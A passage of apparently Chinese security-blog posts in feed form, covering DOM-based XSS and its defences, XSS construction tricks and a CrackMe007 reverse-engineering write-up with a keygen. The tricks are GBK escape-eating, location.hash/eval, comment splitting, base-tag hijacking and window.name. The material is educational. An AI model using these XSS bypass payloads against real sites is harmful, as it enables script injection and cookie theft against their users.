class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//code1 </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> x=<span class="string">&quot;$var&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;a href=&#x27;&quot;</span>+x+<span class="string">&quot;&#x27;&gt;test&lt;/a&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>变量 <code>$var</code> 被写入html页面中，可能产生xss攻击。</p><p>假设用户输入 <code>$var</code> 的值为<code>onclick=alert(1);//</code>，这个值被发送给了服务器端，服务器对其进行了 <code>javascriptEscape</code> 转义处理</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//code2</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> x=<span class="string">&quot;\x20\x27onclick\x3dalert\x281\x29\x3b\x2f\x2f\x27&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">write</span>&#123;<span class="string">&quot;&lt;a href=&#x27;&quot;</span>+x+<span class="string">&quot;&#x27;&gt;test&lt;/a&gt;&quot;</span>&#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>转义后的值被嵌入到HTML模板中，并传递到客户端浏览器。</p><p>但是，这个转义是在服务器端完成的，目的是防止直接在服务器端生成的HTML中执行恶意代码。然而，转义后的字符串被传递到客户端后，浏览器会重新解析这些转义字符，使其恢复原始的恶意代码。</p><p>当浏览器解析并执行这段JavaScript代码的时候，浏览器重新渲染页面，转义后的结果在 <code>document.write</code> 执行时，浏览器会将转义字符还原为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&#x27;&#x27; onclick=alert(1);//&#x27;&#x27;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>点击 <code>test</code> 链接会触发 <code>onclick</code> 事件，成功注入XSS。</p><blockquote><p><strong>为什么会出现这样的转义无效现象？？</strong></p><p>首先，客户端对x的转义在javascript中生效了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var x=&quot;\x20\x27onclick\x3dalert\x281\x29\x3b\x2f\x2f\x27&quot;;(1)</span><br></pre></td></tr></table></figure><p>当这段代码执行的时候，<strong>JavaScript解释器将这些转义字符解析为对应的实际字符</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var x = &quot; &#x27;onclick=alert(1);//&#x27; &quot;;(2)</span><br></pre></td></tr></table></figure><p>注意，这里因为转义的存在，这段javascript代码中将x的内容<code>'onclick=alert(1);//' </code>视作了字符串，并不会对其进行执行</p><p>但是后续document.write执行的时候，会将 <code>x</code> 的内容（已经完成解析，即为上面（2）中的内容）插入到HTML中，而这段<strong>在html上插入时没有进行再转义</strong>，产生了xss漏洞。</p></blockquote></li><li><p><strong>防御方法</strong></p><p><strong>JS输出到HTML页面，也相当于一次XSS输出过程。需要分语境使用不同的编码函数。</strong></p><ul><li><p>首先，当&quot;$var&quot;输出到<code>&lt;script&gt;</code>时，应该执行一次javascriptEncode</p><blockquote><p>这一步是在将用户输入赋值给 JavaScript 变量时进行的编码，确保输入不会被解释为 JavaScript 代码。</p><p>在服务器端和客户端都可以进行编码</p></blockquote></li><li><p>其次，document.write输出到HTML，要分2种情况</p><ul><li>如果document.write输出到事件或者脚本，再做一次javascriptEncode</li><li>如果document.write输出到HTML内容或者属性，则做一次HtmlEncode</li></ul></li></ul></li><li><p><strong>DOM based XSS的触发点</strong></p><ul><li><p>JS输出到HTML页面</p><p>需要重点关注这几个地方的参数是否可以被用户控制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">document.write()</span><br><span class="line">document.writeln()</span><br><span class="line">xxx.innerHTML=</span><br><span class="line">xxx.outerHTML=</span><br><span class="line">innerHTML.replace</span><br><span class="line">document.attachEvent()</span><br><span class="line">window.attachEvent()</span><br><span class="line">document.location.replace()</span><br><span class="line">document.location.assign()</span><br></pre></td></tr></table></figure></li><li><p>其他</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">页面中所有的inputs框</span><br><span class="line">window.location(href、hash等)</span><br><span class="line">window.name</span><br><span class="line">document.referrer</span><br><span class="line">document.cookie</span><br><span class="line">localstorage</span><br><span class="line">XMLHttpRequest返回的数据</span><br></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 客户端脚本安全 </tag>
            
            <tag> XSS攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『跨站脚本攻击』XSS构造技巧</title>
      <link href="/posts/6df.html"/>
      <url>/posts/6df.html</url>
      
        <content type="html"><![CDATA[<p>本文主要介绍如何进行构造XSS</p><h1 id="利用字符编码"><a class="markdownIt-Anchor" href="#利用字符编码"></a> 利用字符编码</h1><ol><li><p><strong>应用场景</strong></p><p>网站对用户的输入中的双引号等特殊符号进行了转义</p></li><li><p><strong>方法</strong></p><p>构造字符编码吃掉转义符号</p></li><li><p><strong>例子</strong></p><p>网站在一个 <code>&lt;script&gt;</code> 标签里面输出了一个用户输入的变量</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> redirectUrl=<span class="string">&quot; &quot;</span>;</span><br></pre></td></tr></table></figure><p>如果我们输入以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;alert(/XSS/);</span><br></pre></td></tr></table></figure><p>因为双引号被转义，所以在html页面上的输出如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> redirectUrl=<span class="string">&quot;\&quot;;alert(/XSS/);&quot;</span>;</span><br></pre></td></tr></table></figure><p>并不能执行后面的XSS代码</p><blockquote><p>javascript中的转义字符是 <code>\</code>，会将特殊符号如单引号、双引号等构造成 <code>\'</code>, <code>\&quot;</code> 的形式。</p><p>在这里的话 <code>\&quot;</code> 就直接被视作文本的 <code>&quot;</code> 了，而并不会和前面的前引号 <code>&quot;</code> 形成闭合。</p></blockquote><p>但是，百度的返回页面是 <code>GBK/GB2312</code> 编码的，因此 <code>%c1\</code>  这两个字符组合在一起后，会成为一个Unicode字符。在firefox浏览器中会认为这是一个字符，所以构造xss攻击代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%c1<span class="string">&quot;;alert(/XSS/);//</span></span><br></pre></td></tr></table></figure><p>在页面上，引号 <code>%c1&quot;</code> 被转义成 <code>%c1\&quot;</code> ，而 <code>%c1\</code> 组成了一个新的Unicode字符，吃掉了转义符号 <code>\</code>，从而让构造的 <code>&quot;</code> 和前面的前引号形成闭合绕过了系统的安全检查，成功实施了XSS注入。</p></li></ol><h1 id="绕过长度限制"><a class="markdownIt-Anchor" href="#绕过长度限制"></a> 绕过长度限制</h1><ol><li><p><strong>应用场景</strong></p><p>有时候服务器端可能对输入变量的长度进行了限制，长度限制不足以构造XSS</p></li><li><p><strong>方法</strong></p><p>1）<strong>使用event</strong></p><ul><li>onclick</li></ul><p>2）<strong>将payload写到别处，通过简短的代码加载这段XSS payload</strong></p><ul><li><p>loaction.hash</p><p><code>location.hash</code> 是 JavaScript 中 <code>location</code> 对象的一个属性，它返回 URL 中的哈希/锚部分（即 <code>#</code> 号及其后面的部分）。</p><blockquote><p><code>location.hash</code> 对象的具体解释：<a link = https://blog.csdn.net/Garrettzxd/article/details/80671034> location.hash详解</a></p></blockquote><p>因为哈希部分不会被发送到服务器，所以服务器端的Web日志中并不会记录下location.hash 里的内容，从而也更好地隐藏了黑客真实的意图。</p><p><code>location.hash</code> 没有长度限制，所以可以将XSS代码写在<code>location.hash</code> 部分，然后在页面中限制长度的地方构造代码执行<code>location.hash</code></p></li><li><p>远程加载js文件</p></li><li><p><strong>利用注释符</strong></p></li></ul></li><li><p><strong>例子</strong></p><p><strong>1）onclick</strong></p><p>构造文本框内输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">alert(1)//</span> &quot;/&gt;</span></span><br></pre></td></tr></table></figure><p><strong>2.1）loaction.hash</strong></p><p>构造url为：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.a.com/test.html#alert(1)</span><br></pre></td></tr></table></figure><p>这里的 <code>#alert(1)</code> 就是<code>location.hash</code></p><p>构造网页中的文本输入框为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;eval(location.hash.substr(1)) &quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>eval（）函数：</p><ul><li>如果参数是一个表达式，eval() 函数将执行表达式。</li><li>如果参数是 Javascript 语句，eval() 将执行 Javascript 语句。</li></ul></blockquote><p>当我们点击这个文本框的时候，会执行 <code>location.hash</code> 中的代码，并去掉哈希部分的第一个字符（<code>#</code>）</p><p>因此，当用户点击这个输入框时， <code>location.hash</code>为 <code>#alert(1)</code>，去掉第一个字符后，<code>eval</code> 函数将执行 <code>alert(1)</code>，从而弹出一个警告框。</p><p>这样就成功执行了我们构造的XSS攻击代码。</p><p><strong>2.3）利用注释符</strong></p><p>网站上存在两个文本框，第一个文本框存在长度限制，第二个文本框允许写入更多的字节。</p><p>此时可以利用HTML的“注释符号”，把两个文本框之间的HTML代码全部注释掉，从而“打通”两个<code>&lt;input&gt;</code> 标签。</p><p>例，有2个文本框</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">1</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">xxxxxxxxxxxxx</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">2</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>在第一个input文本框中，输入：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; onfocus=&quot;</span><span class="keyword">var</span> a=<span class="string">&#x27;This is a long &#x27;</span>;<span class="string">&quot;&gt;&lt;!--</span></span><br></pre></td></tr></table></figure><blockquote><p><code>onfocus</code> 事件是一个 JavaScript 事件，它在元素获得焦点时触发。焦点是指用户通过点击、触摸或使用键盘（如 Tab 键）将输入光标或选中状态移动到某个元素上。</p><p>在 HTML 中，<code>onfocus</code> 事件可以直接在元素标签内部指定</p></blockquote><p>在第二个input文本框中，输入：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(a + <span class="string">&#x27;XSS attack!&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>最终生成的html代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input id=<span class="string">&quot;input1&quot;</span> type=<span class="string">&quot;text&quot;</span> value=<span class="string">&quot;&quot;</span> onfocus=<span class="string">&quot;var a=&#x27;This is a long &#x27;;&quot;</span>&gt;&lt;!--<span class="string">&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;!-- Some HTML content or other inputs --&gt;</span></span><br><span class="line"><span class="string">&lt;input id=&quot;</span>input2<span class="string">&quot; type=&quot;</span>text<span class="string">&quot; value=&quot;</span>--&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(a + <span class="string">&#x27;XSS attack!&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><span class="string">&quot; /&gt;</span></span><br></pre></td></tr></table></figure><p>在这个例子中，当第一个文本框获得焦点时，会执行 <code>onfocus</code> 事件中的JavaScript代码，定义了一个变量 <code>a</code>。由于第一个文本框的值以 <code>&quot;&gt;&lt;!--</code> 结尾，它实际上将中间的HTML内容注释掉了，直到遇到第二个文本框中的 <code>--&gt;</code>，这结束了注释。然后，第二个文本框中的 <code>&lt;script&gt;</code> 标签被正确解析并执行，弹出带有完整消息的警告框。</p><p>通过这种方式，我们成功地将较长的攻击代码分割成两个部分，并利用HTML注释符将它们连接起来，绕过了单个输入字段的长度限制。</p></li></ol><h1 id="使用base标签"><a class="markdownIt-Anchor" href="#使用base标签"></a> 使用base标签</h1><p><code>&lt;base&gt;</code> 标签的作用是定义页面上的所有使用“相对路径”标签的hosting地址，可以作用于该标签之后的所有标签。</p><p>例如：</p><p>这样访问的img路径就是 <code>http://www.google.com/intl/en_ALL/images/srpr/logo1w.png</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://www.google.com&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/intl/en_ALL/images/srpr/logo1w.png&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>攻击者如果在页面中插入了 <code>&lt;base&gt;</code> 标签，就可以通过在远程服务器上伪造图片、链接或脚本，劫持当前页面中的所有使用“相对路径”的标签。</p><p>因此需要对这个标签进行过滤。</p><h1 id="windowname"><a class="markdownIt-Anchor" href="#windowname"></a> <a href="http://window.name">window.name</a></h1><p>对当前窗口的<code>window.name</code> 对象赋值，没有特殊字符的限制。</p><p>因为window对象是浏览器的窗体，而并非document对象，因此很多时候window对象不受同源策略的限制。黑客利用这个对象，可以实现跨域、跨页面传递数据。</p><p><a href="http://xn--window-vt9i248w.name">使用window.name</a> 可以缩短XSS Payload的长度，如下所示：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">window.name = &quot;alert(document.cookie)&quot;;</span><br><span class="line">locaton.href = &quot;http://www.xssedsite.com/xssed.php&quot;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>在同一窗口打开存在XSS的站点后，只需通过XSS执行name中的代码即可：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(name);</span><br></pre></td></tr></table></figure><p>只有11个字节，短到了极点。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 客户端脚本安全 </tag>
            
            <tag> XSS攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『逆向』CrackMe007 逆向分析</title>
      <link href="/posts/7dac.html"/>
      <url>/posts/7dac.html</url>
      
        <content type="html"><![CDATA[<h1 id="工具安装"><a class="markdownIt-Anchor" href="#工具安装"></a> 工具安装</h1><ul><li><p><a href="https://github.com/TonyChen56/160-Crackme/tree/master/160%E4%B8%AACrackme007">crackme 007程序下载地址</a></p></li><li><p><a href="https://www.52pojie.cn/thread-1472768-1-1.html">Windows DarkDe4下载安装</a></p></li></ul><h1 id="程序分析"><a class="markdownIt-Anchor" href="#程序分析"></a> 程序分析</h1><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240421234051364.png" alt="image-20240421234051364" /></p><p>点击help，可以看到提示：破解目标是使所有的按钮消失，让程序下面的蓝色logo完整显现出来，不允许爆破。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422105549546.png" alt="image-20240422105549546" /></p><h1 id="逆向分析"><a class="markdownIt-Anchor" href="#逆向分析"></a> 逆向分析</h1><h2 id="脱壳"><a class="markdownIt-Anchor" href="#脱壳"></a> 脱壳</h2><p>用Exeinfo PE工具查看该程序，得到信息如下图，可知该程序没有加壳，用Delphi语言编写。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422110526986.png" alt="image-20240422110526986" /></p><p>并不需要脱壳处理</p><h2 id="darkde查看事件控件"><a class="markdownIt-Anchor" href="#darkde查看事件控件"></a> DarkDe查看事件控件</h2><p>因为是delphi的程序，先<strong>用Delphi的专用反编译工具DarkDe搜索涉及到的控件和事件函数信息</strong></p><p>事件信息：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422111325644.png" alt="image-20240422111325644" /></p><p>控件信息：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422111332284.png" alt="image-20240422111332284" /></p><p>可以看到程序有以下几个事件:</p><ul><li>Cancella按钮的点击事件</li><li>About按钮的点击事件</li><li>Registerz按钮的点击事件</li><li>Again按钮的点击事件</li></ul><p>总共四个按钮事件。</p><p>在程序最开始并没有看到Again按钮，猜测为一个隐藏按钮。最开始只有一个Register按钮，因此我们<strong>后续就从Registerz按钮的点击事件开始分析</strong>。</p><h2 id="爆破"><a class="markdownIt-Anchor" href="#爆破"></a> 爆破</h2><p>将程序拖入ollydbg</p><p>分别在前面发现的事件对应的位置：00442B98，00442F28，004430BC上下断点</p><p>首先在Registerz按钮点击事件的位置 <code>00442F28</code> 下断点</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422113737449.png" alt="image-20240422113737449" /></p><p>运行程序，随便输入name = 123，Codice = 123，F8向下单步执行。</p><p>可以看到这里有两个calll，调用了两个函数，去对应的地址看一下，第一个函数为获取codice，第二个函数检测codice是否为纯数字。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422155744890.png" alt="image-20240422155744890" /></p><p>继续单步执行，走到下面的 <code>je</code> 跳转代码后，跳转到了 <code>00442F9D</code> 。</p><p>分析下面的 <code>je</code> 跳转代码，可以知道这里对codice进行了验证，如果codice是纯数字则跳转到 <code>00442F9D</code> 继续执行，如果不是纯数字则会弹窗 <code> &quot;You MUST insert a valid Long Integer Value in the Code Editor... Thank you :)&quot;</code></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422161158972.png" alt="image-20240422161158972" /></p><p>所以正常情况下应该执行  <code>00442F9D</code> ，观察 <code>00442F9D</code> 后的代码，可以看到走到 <code>00442F9F  </code> 又会跳转到 <code>00442FFB</code> ，但是这个跳转处的注释为 “Please… The Code Must be &gt;0”，很明显这是一个异常提示的跳转，所以在这里未发生跳转为程序正常执行</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422161337070.png" alt="image-20240422161337070" /></p><p>继续查看未发生跳转部分的汇编代码，可以看到 <code>00442FC0  </code> 处存在第三个跳转到 <code>00442FF2  </code> ，从 <code>00442FF2  </code> 处向下看经过了 <code>00442FFB</code> 处也就是错误提示的字符串，所以在 <code>00442FC0  </code> 处我们不让程序发生跳转，将 je 改为NOP</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422162604439.png" alt="image-20240422162604439" /></p><p>F9继续运行程序，可以看到register按钮消失，出现了新的按钮again，直接点击again，可以看到停在了我们前面打的断点 <code>004430BC</code> 处。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422163242089.png" alt="image-20240422163242089" /></p><p>向下翻看代码发现和前面的register按钮函数类似，我们执行同样的操作，将找到的位置 <code>00443159</code> 改为NOPs。</p><p>F9继续运行，可以看到已经成功实现了logo的还原，成功爆破。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422163618513.png" alt="image-20240422163618513" /></p><h2 id="序号生成算法分析"><a class="markdownIt-Anchor" href="#序号生成算法分析"></a> 序号生成算法分析</h2><p>根据前面的爆破可以知道，register按钮和again按钮消失的逻辑分别出现在 <code>00442F9F</code> 和 <code>00443159</code> 之后。</p><p>所以首先对register按钮的 <code>00442F9F</code> 进行分析，分析后面的代码可以知道 <code>00442FB9</code> 为算法函数</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422164900113.png" alt="image-20240422164900113" /></p><p>crtl + G 跟进到 <code>00442FB9</code> 查看算法函数，可以看到要求用户名要大于4个字符</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422165807004.png" alt="image-20240422165807004" /></p><p>在算法后续的计算中涉及到了 eax ，回到前面可以发现在<code>00442FB9</code> 的前面有一个对 eax进行赋值的操作： <code>00442FB4</code>位置对eax进行了赋值，将地址445830的数值赋给了eax。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423143154927.png" alt="image-20240423143154927" /></p><p>再检查在什么地方对地址445830进行了赋值，在地址442FB4处[右键]-[查找参考]-[地址常量]，可以查找到程序中所有涉及到这个地址常量的位置。</p><p>可以看到这个地址前面存在一个对445830进行赋值的操作，双击查看</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423145554207.png" alt="image-20240423145554207" /></p><p>可以看到，当Codice输入的不全是数字时才对[0x445830] 赋值操作，而所赋的值为 <code>00442F81</code> 处调用函数 <code>00442A8C</code> 的返回值</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423145736385.png" alt="image-20240423145736385" /></p><p>对00442A8C进行进一步分析，可以知道对应的[0x445830] 赋值方法</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423150158348.png" alt="image-20240423150158348" /></p><p>发现存在逻辑：</p><p>当<strong>第一次输入的密码不为纯数字</strong>的时候，程序会根据密码生成一个值 <code>[0x445830]</code>，后续密码不为纯数字时需要根据这个值来进行运算，所以第一次输入的时候，密码一定要为纯字母，不然无法注册成功。</p><p>接下来进行了两层循环，计算的是用户名的第一位和最后一位的乘积，然后再乘以 <code>[0x445830]</code> 。外层循环变换用户名最后一位，每次往前移动一位。内层循环变换用户名第一位，每次往后移动一位。接着将结果保存到eax。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422170314520.png" alt="image-20240422170314520" /></p><ul><li>将eax对 <code>0xA2C2A</code> 取模，记为结果1</li><li>将输入的密码除以 0x59 加上密码mod0x50，结果再加1，记为结果2</li><li>比较结果1和结果2是否相等。相等则返回1，消失按钮。不相等则返回0。</li></ul><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422170812472.png" alt="image-20240422170812472" /></p><p>again 按钮的函数算法类似</p><h1 id="注册机"><a class="markdownIt-Anchor" href="#注册机"></a> 注册机</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">szBuff = <span class="built_in">bytearray</span>(<span class="number">30</span>)</span><br><span class="line">CoBuff = <span class="built_in">bytearray</span>(<span class="number">30</span>)</span><br><span class="line">Regcode = <span class="number">0</span></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line">Temp = <span class="number">0x37B</span></span><br><span class="line">Sum = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;CrackeMe007注册机使用说明:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;输入纯字母的codice，关闭报错弹窗后填入计算出的正确codice&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;请输入不少于6位的全字母codice:&quot;</span>)</span><br><span class="line">szBuff = <span class="built_in">input</span>().encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(szBuff) - <span class="number">1</span>):</span><br><span class="line">    Temp = Temp + ((szBuff[i + <span class="number">1</span>] % <span class="number">0x11</span> + <span class="number">1</span>) * szBuff[i])</span><br><span class="line"></span><br><span class="line">Temp = Temp % <span class="number">0x7148</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;请输入用户名:不少于5位的纯数字&quot;</span>)</span><br><span class="line">CoBuff = <span class="built_in">input</span>().encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(CoBuff)):</span><br><span class="line">    Sum = Sum + CoBuff[i]</span><br><span class="line"></span><br><span class="line">Sum = (Sum * Sum * Temp) % <span class="number">0XA2C2A</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0X50</span>):</span><br><span class="line">    Regcode = (Sum - i - <span class="number">1</span>) * <span class="number">0X59</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0X50</span>):</span><br><span class="line">        Temp = (Regcode + j) % <span class="number">0X50</span></span><br><span class="line">        <span class="keyword">if</span> Temp == i:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;用户名:%s对应的第%d个可用的注册码：%d&quot;</span> % (CoBuff.decode(<span class="string">&#x27;utf-8&#x27;</span>), a, Regcode + j))</span><br><span class="line">            a = a + <span class="number">1</span></span><br><span class="line">        Temp = <span class="number">0x60</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;Press Enter to exit...&quot;</span>)</span><br><span class="line">sys.exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>随便构造纯数字的name和全字母的codice</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423140221413.png" alt="image-20240423140221413" /></p><p>产生报错，用上面的注册机生成密码</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423140316807.png" alt="image-20240423140316807" /></p><p>输入生成的第一个codice，可以看到register按钮消失</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423140341510.png" alt="image-20240423140341510" /></p><p>再输入前面固定的字符串，点击again按钮</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423140629271.png" alt="image-20240423140629271" /></p><p>再输入前面注册机得到的codice，成功显现所有的Logo，完成破解</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423140701596.png" alt="image-20240423140701596" /></p><h1 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章"></a> 参考文章</h1><ul><li><a href="https://www.cnblogs.com/lonenysky/p/11345362.html">逆向破解之160个CrackMe —— 007</a></li><li><a 